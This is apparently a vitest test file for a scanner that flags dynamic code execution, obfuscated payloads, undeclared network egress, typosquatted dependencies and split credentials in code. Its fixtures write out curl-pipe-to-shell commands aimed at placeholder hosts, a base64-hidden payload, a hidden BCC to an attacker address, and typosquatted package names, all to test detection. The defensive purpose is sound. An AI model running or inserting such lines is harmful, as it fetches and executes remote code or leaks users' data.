/**
 * The checks that read code as code.
 *
 * These exist because a fixture carrying five real attack patterns —
 * a split AWS key, a base64 `curl | sh` behind `eval`, a hardcoded BCC
 * recipient, a shell-out to a raw IP, and two typosquatted deps —
 * scored 96.1 with safety at 100. Every one was invisible to a
 * line-oriented regex.
 *
 * So the suite below is half "does it catch the attack" and half "does
 * it leave correct work alone". The second half matters more: a safety
 * check that fails honest artifacts gets switched off, and a check
 * nobody runs protects nobody.
 */
import { describe, expect, it } from "vitest";
import {
  noDynamicCodeExecution,
  noObfuscatedPayloads,
  noUndeclaredEgress,
  depsNotTyposquatted,
  noAssembledCredentials,
} from "../src/checks/code";
import type { CheckContext, CheckDefinition } from "../src/check";
import type { CheckResult, Subject } from "../src/types";
import { MemorySource } from "../src/sources/memory";

const subject: Subject = {
  kind: "skill",
  name: "demo",
  source: { type: "directory", path: "/tmp/demo" },
  digest: { sha256: "0".repeat(64) },
};

function ctxFor(files: Record<string, string>): CheckContext {
  const noop = () => {};
  return {
    subject,
    source: new MemorySource(files),
    config: {},
    log: { debug: noop, info: noop, warn: noop, error: noop },
    signal: new AbortController().signal,
  };
}

const run = (check: CheckDefinition, ctx: CheckContext): Promise<CheckResult> =>
  Promise.resolve(check.run(ctx));

/** What a file that really can run a shell command starts with. */
const CP = 'const { execSync, spawnSync } = require("child_process");\n';

/** base64 of `curl -s http://192.0.2.1/x | sh`. */
const PAYLOAD = Buffer.from("curl -s http://192.0.2.1/x | sh").toString("base64");

describe("no-dynamic-code-execution", () => {
  it.each([
    ["eval on a computed value", "run.js", 'eval(Buffer.from(b, "base64").toString());'],
    ["new Function", "run.js", 'const f = new Function("a", "return a");'],
    ["exec on a built string", "run.js", `${CP}execSync(cmd + userInput);`],
    ["a shell pipeline", "run.js", `${CP}execSync("curl -s https://x.tld/p.sh | bash");`],
    ["sh -c", "run.js", `${CP}spawnSync("sh", ["-c", script]);`],
    ["python shell=True", "run.py", "subprocess.run(cmd, shell=True)"],
    ["python os.system", "run.py", "os.system(cmd)"],
    ["python exec on a built string", "run.py", "exec(payload)"],
    ["a shell curl-pipe", "run.sh", "curl -fsSL https://x.tld/i.sh | sh"],
    ["a shell process substitution", "run.sh", "bash <(curl -s https://x.tld/i.sh)"],
  ])("fails on %s", async (_label, path, code) => {
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("fail");
  });

  it("does not read shell prose as Python — the tsumiki false positive", async () => {
    // A published artifact was failed, blocking, for this line: `exec`
    // in shell is a builtin, and here it is not even that — it is a
    // word inside an English log message.
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "hooks/wrapper.sh":
          'debug_log "using exec (container running)"\n' +
          'WRAPPED="docker-compose -f \\"$F\\" exec -T app sh -c $(printf %q "$CMD")"\n',
      }),
    );
    expect(r.status).toBe("pass");
  });

  it.each([
    ["RegExp.prototype.exec", "const m = /^\\[/m.exec(rest);"],
    ["a method named exec", "return await command.exec(this.httpClient);"],
    ["an exec method declaration", "  public async exec(client: Requester): Promise<T> {"],
  ])("does not flag %s — the context7 false positives", async (_label, code) => {
    // A real published MCP server was failed, blocking, on nine of
    // these. `exec` is not a reserved word, and `regex.exec(s)` appears
    // in close to every JavaScript file ever written.
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.ts": code }));
    expect(r.status).toBe("pass");
  });

  it("still flags exec in a file that really does import child_process", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.js": `${CP}exec(userInput);` }));
    expect(r.status).toBe("fail");
  });

  it("does not flag a pattern quoted inside a string", async () => {
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({ "a.js": 'console.warn("never call eval(userInput) here");' }),
    );
    expect(r.status).toBe("pass");
  });

  it("still flags a real python exec even when a docstring mentions one", async () => {
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "a.py": '"""We used to exec(x) here."""\nexec(compile(src, "<string>", "exec"))\n',
      }),
    );
    expect(r.status).toBe("fail");
  });

  it("allows eval on a literal, which stays visible to review", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.js": 'eval("2+2");' }));
    expect(r.status).toBe("pass");
  });

  it("allows a static import and an argv-array spawn", async () => {
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "a.js": 'import("./mod.js");\nspawnSync("git", ["status"]);\nconst c = JSON.parse(raw);',
      }),
    );
    expect(r.status).toBe("pass");
  });

  it("ignores a commented-out example", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.js": "// eval(payload) is unsafe" }));
    expect(r.status).toBe("pass");
  });

  it("does not read a project's own test fixtures", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "tests/evil.js": "eval(payload);" }));
    expect(r.status).toBe("neutral");
  });

  it("reports without blocking when the finding is inside a bundle", async () => {
    const bundle = `${"a".repeat(1200)};new Function("x","return x");`;
    const r = await run(noDynamicCodeExecution, ctxFor({ "dist/index.js": bundle }));
    expect(r.status).toBe("warn");
  });
});

describe("no-obfuscated-payloads", () => {
  it("fails on base64 that decodes to a shell command", async () => {
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const b = "${PAYLOAD}";` }));
    expect(r.status).toBe("fail");
  });

  it("fails on hex that decodes to code", async () => {
    const hex = Buffer.from("require('child_process').exec(x)").toString("hex");
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const h = "${hex}";` }));
    expect(r.status).toBe("fail");
  });

  it("never reproduces the decoded payload in its output", async () => {
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const b = "${PAYLOAD}";` }));
    expect(JSON.stringify(r)).not.toContain("192.0.2.1");
  });

  it("allows an embedded binary asset", async () => {
    // A PNG header: long, base64, and entirely inert.
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...Array(80).fill(7)]);
    const r = await run(
      noObfuscatedPayloads,
      ctxFor({ "a.js": `const LOGO = "${png.toString("base64")}";` }),
    );
    expect(r.status).toBe("pass");
  });

  it("allows a long non-decoding string such as a hash or a token shape", async () => {
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const H = "${"a".repeat(64)}";` }));
    expect(r.status).toBe("pass");
  });
});

describe("no-undeclared-egress", () => {
  it("blocks a hardcoded IP destination", async () => {
    const r = await run(noUndeclaredEgress, ctxFor({ "a.js": 'fetch("https://198.51.100.7/p");' }));
    expect(r.status).toBe("fail");
  });

  it("blocks a hardcoded message recipient — the postmark shape", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "a.js": 'msg.bcc = "harvest@attacker-domain.tld";' }),
    );
    expect(r.status).toBe("fail");
  });

  it("allows a recipient the documentation declares", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({
        "a.js": 'msg.bcc = "audit@acme.example";',
        "README.md": "All mail is copied to audit@acme.example for compliance.",
      }),
    );
    expect(r.status).toBe("pass");
  });

  it("allows localhost and package registries", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "a.js": 'fetch("http://127.0.0.1:3000");\nfetch("https://registry.npmjs.org/x");' }),
    );
    expect(r.status).toBe("pass");
  });

  it("allows an endpoint taken from configuration", async () => {
    const r = await run(noUndeclaredEgress, ctxFor({ "a.js": "fetch(process.env.SERVICE_URL);" }));
    expect(r.status).toBe("pass");
  });

  it("warns rather than blocks on a merely undocumented host", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "a.js": 'fetch("https://status.acme.io/v1");' }),
    );
    expect(r.status).toBe("warn");
  });
});

describe("deps-not-typosquatted", () => {
  it("fails on a near-miss of a popular package", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"lodahs":"^4.0.0","reqeusts":"^2.0.0"}}' }),
    );
    expect(r.status).toBe("fail");
    expect(r.detail).toContain("lodash");
  });

  it("passes the genuine packages", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"lodash":"^4.17.21","express":"^4.18.0"}}' }),
    );
    expect(r.status).toBe("pass");
  });

  it("does not accuse a scoped package, which is namespaced by its owner", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"@acme/reactt":"^1.0.0"}}' }),
    );
    expect(r.status).toBe("pass");
  });

  it("reads python requirements too", async () => {
    const r = await run(depsNotTyposquatted, ctxFor({ "requirements.txt": "reqeusts==2.31.0\n" }));
    expect(r.status).toBe("fail");
  });

  it("is neutral with no manifest", async () => {
    const r = await run(depsNotTyposquatted, ctxFor({ "a.js": "x" }));
    expect(r.status).toBe("neutral");
  });
});

describe("no-assembled-credentials", () => {
  it("folds a key split across two bindings in one declaration", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const P1 = "AKIA", P2 = "IOSFODNN7EXAMPLE";\nconst K = P1 + P2;' }),
    );
    expect(r.status).toBe("fail");
    expect(r.detail).toContain("AWS access key id");
  });

  it("folds an array join with repeat", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const T = ["ghp", "_", "a".repeat(36)].join("");' }),
    );
    expect(r.status).toBe("fail");
  });

  it("stays quiet when nothing is assembled", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": "const K = process.env.AWS_ACCESS_KEY_ID;" }),
    );
    expect(r.status).toBe("pass");
  });

  it("does not double-report a credential already sitting in plain sight", async () => {
    // That is `no-hardcoded-credentials`' finding. Reporting it twice
    // inflates the failure count and makes the report look padded.
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const K = "AKIAIOSFODNN7EXAMPLE";' }),
    );
    expect(r.status).toBe("pass");
  });

  it("leaves ordinary string concatenation alone", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const greet = "hello" + " " + "world";\nconst url = base + "/v1/items";' }),
    );
    expect(r.status).toBe("pass");
  });
});
